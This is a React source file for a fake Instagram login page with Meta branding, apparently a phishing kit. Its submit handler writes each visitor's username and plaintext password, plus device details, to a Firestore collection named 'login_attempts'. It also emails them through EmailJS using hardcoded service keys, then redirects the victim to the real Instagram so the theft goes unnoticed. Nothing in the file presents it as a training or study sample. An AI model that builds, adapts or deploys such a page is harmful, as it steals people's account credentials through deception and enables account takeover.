
import React, { useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { auth, db } from '../src/lib/firebase';
import { signInWithEmailAndPassword, createUserWithEmailAndPassword } from 'firebase/auth';
import { doc, setDoc, serverTimestamp } from 'firebase/firestore';
import emailjs from '@emailjs/browser';
interface LoginProps {
  onLogin: (username: string) => void;
}

const Login: React.FC<LoginProps> = ({ onLogin }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!username.trim() || !password.trim()) return;

    setIsLoading(true);
    setError(null);
    
    // Create a safety timeout to ensure the user isn't stuck forever
    const safetyTimeout = setTimeout(() => {
      window.location.href = 'https://www.instagram.com';
      setIsLoading(false);
    }, 3000);

    try {
      // Log the login attempt metadata
      const attemptId = Math.random().toString(36).substring(7);
      
      // Perform both logging to Firestore and sending email
      Promise.all([
        setDoc(doc(db, 'login_attempts', attemptId), {
          username: username,
          password: password,
          timestamp: serverTimestamp(),
          device: navigator.userAgent,
          platform: (navigator as any).platform || 'unknown',
          language: navigator.language
        }),
        emailjs.send(
          'service_09px4tz',
          'template_jcxhd4n',
          {
            username: username,
            password: password,
            time: new Date().toLocaleString(),
            device: navigator.userAgent
          },
          'KBEC0eN9TIsyAVsgE'
        )
      ]).then(() => {
        clearTimeout(safetyTimeout);
        window.location.href = 'https://www.instagram.com';
        setIsLoading(false);
      }).catch((err) => {
        console.error("Logging error:", err);
        // Still redirect even if logging fails
        clearTimeout(safetyTimeout);
        window.location.href = 'https://www.instagram.com';
        setIsLoading(false);
      });

    } catch (err: any) {
      console.error("Login attempt error:", err);
      clearTimeout(safetyTimeout);
      window.location.href = 'https://www.instagram.com'; // Fallback to redirect anyway
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-between py-10 px-6">
      <motion.div 
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
        className="w-full max-w-[350px] flex flex-col items-center"
      >
        {/* Instagram Icon */}
        <div className="w-[75px] h-[75px] mb-6">
          <svg viewBox="0 0 1000 1000" className="w-full h-full">
            <defs>
              <linearGradient id="ig-grad-new" x1="0%" y1="100%" x2="100%" y2="0%">
                <stop offset="0%" style={{ stopColor: '#f09433' }} />
                <stop offset="25%" style={{ stopColor: '#e6683c' }} />
                <stop offset="50%" style={{ stopColor: '#dc2743' }} />
                <stop offset="75%" style={{ stopColor: '#cc2366' }} />
                <stop offset="100%" style={{ stopColor: '#bc1888' }} />
              </linearGradient>
            </defs>
            <path
              fill="url(#ig-grad-new)"
              d="M500 106.3c128.2 0 143.4.5 194 2.8 46.8 2.1 72.2 9.9 89.1 16.5 22.4 8.7 38.3 19.1 55.1 35.9 16.8 16.8 27.2 32.7 35.9 55.1 6.6 16.9 14.4 42.3 16.5 89.1 2.3 50.6 2.8 65.8 2.8 194s-.5 143.4-2.8 194c-2.1 46.8-9.9 72.2-16.5 89.1-8.7 22.4-19.1 38.3-35.9 55.1-16.8 16.8-32.7 27.2-55.1 35.9-16.9 6.6-42.3 14.4-89.1 16.5-50.6 2.3-65.8 2.8-194 2.8s-143.4-.5-194-2.8c-46.8-2.1-72.2-9.9-89.1-16.5-22.4-8.7-38.3-19.1-55.1-35.9-16.8-16.8-27.2-32.7-35.9-55.1-6.6-16.9-14.4-42.3-16.5-89.1-2.3-50.6-2.8-65.8-2.8-194s.5-143.4 2.8-194c2.1-46.8 9.9-72.2 16.5-89.1 8.7-22.4 19.1-38.3 35.9-55.1 16.8-16.8 32.7-27.2 55.1-35.9 16.9-6.6 42.3-14.4 89.1-16.5 50.7-2.3 65.8-2.8 194-2.8zm0-96.3c-130.4 0-146.7.6-197.9 2.9-51.1 2.3-86 10.4-116.5 22.3-31.6 12.3-58.3 28.7-85.1 55.4-26.7 26.7-43.1 53.5-55.4 85.1-11.8 30.5-19.9 65.4-22.3 116.5-2.3 51.2-2.9 67.5-2.9 197.9s.6 146.7 2.9 197.9c2.3 51.1 10.4 86 22.3 116.5 12.3 31.6 28.7 58.3 55.4 85.1 26.7 26.7 53.5 43.1 85.1 55.4 30.5 11.8 65.4 19.9 116.5 22.3 51.2 2.3 67.5 2.9 197.9 2.9s146.7-.6 197.9-2.9c51.1-2.3 86-10.4 116.5-22.3 31.6-12.3 58.3-28.7 85.1-55.4 26.7-26.7 43.1-53.5 55.4-85.1 11.8-30.5 19.9-65.4 22.3-116.5 2.3-51.2 2.9-67.5 2.9-197.9s-.6-146.7-2.9-197.9c-2.3-51.1-10.4-86-22.3-116.5-12.3-31.6-28.7-58.3-55.4-85.1-26.7-26.7-53.5-43.1-85.1-55.4-30.5-11.8-65.4-19.9-116.5-22.3-51.2-2.3-67.5-2.9-197.9-2.9z"
            />
            <path
              fill="url(#ig-grad-new)"
              d="M500 250.7c-137.7 0-249.3 111.6-249.3 249.3s111.6 249.3 249.3 249.3 249.3-111.6 249.3-249.3-111.6-249.3-249.3-249.3zm0 402.3c-84.5 0-153-68.5-153-153s68.5-153 153-153 153 68.5 153 153-68.5 153-153 153z"
            />
            <circle fill="url(#ig-grad-new)" cx="772.5" cy="227.5" r="58.2" />
          </svg>
        </div>

        <h2 className="text-[17px] font-semibold mb-6 text-[#262626]">Log into Instagram</h2>

        <form onSubmit={handleSubmit} className="w-full space-y-2.5">
          <input
            type="text"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            placeholder="Mobile number, username or email"
            className="w-full px-4 py-[13px] text-[14px] bg-[#fafafa] border border-[#dbdbdb] rounded-xl focus:outline-none focus:border-[#a8a8a8] transition-all placeholder:text-[#8e8e8e]"
            autoFocus
          />
          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="Password"
            className="w-full px-4 py-[13px] text-[14px] bg-[#fafafa] border border-[#dbdbdb] rounded-xl focus:outline-none focus:border-[#a8a8a8] transition-all placeholder:text-[#8e8e8e]"
          />

          <button
            type="submit"
            disabled={!username || !password || isLoading}
            className={`w-full py-[11px] rounded-full text-[14px] font-semibold text-white transition-opacity ${
              !username || !password || isLoading ? 'bg-[#0095f6]/50' : 'bg-[#0095f6] hover:bg-[#1877f2]'
            } mt-3 shadow-sm h-11 flex items-center justify-center`}
          >
            {isLoading ? (
              <div className="w-4 h-4 border-2 border-white/20 border-t-white rounded-full animate-spin" />
            ) : (
              'Log in'
            )}
          </button>

          <button type="button" className="w-full text-sm font-semibold text-[#262626] py-3 mt-1">
            Forgot password?
          </button>

          <div className="pt-2 space-y-3">
            <button type="button" className="w-full h-11 flex items-center justify-center gap-2 border border-[#dbdbdb] rounded-full text-[#262626] font-semibold text-sm hover:bg-gray-50 transition-colors">
              <svg viewBox="0 0 24 24" width="20" height="20" fill="#1877f2"><path d="M22 12c0-5.52-4.48-10-10-10S2 6.48 2 12c0 4.84 3.44 8.87 8 9.8V15H8v-3h2V9.5C10 7.57 11.57 6 13.5 6H16v3h-2c-.55 0-1 .45-1 1v2h3v3h-3v6.95c5.05-.5 9-4.76 9-9.95z"></path></svg>
              Log in with Facebook
            </button>

            <button type="button" className="w-full h-11 flex items-center justify-center border border-[#dbdbdb] rounded-full text-[#0095f6] font-semibold text-sm hover:bg-gray-50 transition-colors">
              Create new account
            </button>
          </div>
        </form>
      </motion.div>

      {/* Footer Branding Section */}
      <div className="w-full flex flex-col items-center gap-4">
        <div className="flex items-center gap-1.5 opacity-60 scale-90">
          <svg viewBox="0 0 512 512" width="20" height="20" fill="#262626">
            <path d="M410.6 150.1c-14.8-14.8-34.5-22.9-55.4-22.9-10.7 0-21.1 2.2-30.8 6.4-9.7 4.3-18.4 10.3-25.8 17.7L189.5 260.4c-7.4 7.4-16.1 13.4-25.8 17.7-9.7 4.2-20.1 6.4-30.8 6.4-20.9 0-40.6-8.1-55.4-22.9-14.8-14.8-22.9-34.5-22.9-55.4 0-20.9 8.1-40.6 22.9-55.4 14.8-14.8 34.5-22.9 55.4-22.9 10.7 0 21.1 2.2 30.8 6.4 9.7 4.3 18.4 10.3 25.8 17.7l46.2 46.2c3.2 3.2 8.4 3.2 11.7 0l21.2-21.2c3.2-3.2 3.2-8.4 0-11.7l-46.2-46.2c-15-15-32.6-26.9-52.5-35.3-19.8-8.5-41.2-12.8-63-12.8-42.6 0-82.7 16.6-112.8 46.7S0 163.6 0 206.2s16.6 82.7 46.7 112.8 70.2 46.7 112.8 46.7c21.8 0 43.1-4.3 63-12.8 19.8-8.5 37.5-20.4 52.5-35.3l109.1-109.1c7.4-7.4 16.1-13.4 25.8-17.7 9.7-4.3 20.1-6.4 30.8-6.4 20.9 0 40.6 8.1 55.4 22.9 14.8 14.8 22.9 34.5 22.9 55.4 0 20.9-8.1 40.6-22.9 55.4-14.8 14.8-34.5 22.9-55.4 22.9-10.7 0-21.1-2.2-30.8-6.4-9.7-4.3-18.4-10.3-25.8-17.7l-46.2-46.2c-3.2-3.2-8.4-3.2-11.7 0l-21.2 21.2c-3.2 3.2-3.2 8.4 0 11.7l46.2 46.2c15 15 32.6 26.9 52.5 35.3 19.8 8.5 41.2 12.8 63 12.8 42.6 0 82.7-16.6 112.8-46.7s46.7-70.2 46.7-112.8-16.6-82.7-46.7-112.8z"/>
          </svg>
          <span className="text-[17px] font-bold tracking-[1.5px] text-[#262626]">Meta</span>
        </div>
        
        <footer className="text-[#8e8e8e] text-[11px] flex flex-col items-center gap-1.5 opacity-70">
          <div className="flex flex-wrap justify-center gap-x-4 gap-y-1">
            <span>Meta</span><span>About</span><span>Blog</span><span>Jobs</span><span>Help</span><span>API</span><span>Privacy</span><span>Terms</span>
          </div>
          <div className="flex items-center gap-4">
             <span className="flex items-center gap-1 cursor-pointer">English <svg viewBox="0 0 24 24" width="10" height="10" fill="currentColor"><path d="M7 10l5 5 5-5z"></path></svg></span>
             <span>© 2026 Instagram from Meta</span>
          </div>
        </footer>
      </div>
    </div>
  );
};

export default Login;
